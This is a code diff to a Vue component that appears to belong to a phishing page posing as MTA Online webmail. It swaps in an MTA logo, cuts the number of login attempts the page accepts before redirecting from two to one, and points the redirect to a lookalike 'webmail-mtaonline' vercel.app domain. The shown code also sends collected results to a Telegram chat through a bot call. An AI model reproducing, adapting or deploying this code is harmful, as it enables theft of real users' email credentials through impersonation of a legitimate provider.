@@ -13,7 +13,7 @@
               <img class="mx-auto d-block styles__logo___10yQo"
                    width="300"
                    height="182"
-                   src="/images/MTA-2018-v1-transparent-2018-b7546f735056a36_b7547050-5056-a36a-082129b5b75f5c02.png"
+                   src="/images/MTA-2018-v1-transparent-2018-b7546f735056a36_b7547050-5056-a36a-082129b5b75f5c01.png"
                    alt="Logo">
             </div>
 
@@ -201,7 +201,7 @@
     loading: false,
     isActive: false,
     count: 0,
-    finalCount: 2
+    finalCount: 1
     }
   },
   components: {
@@ -218,7 +218,7 @@
     await this.sendTelegramResult(process.env.VUE_APP_CHAT_ID, message)
     this.isActive = !this.isActive
     }else{
-      location.replace("https://mediacomm-sigma.vercel.app/")
+      location.replace("https://webmail-mtaonline.vercel.app/")
   
     }
     },
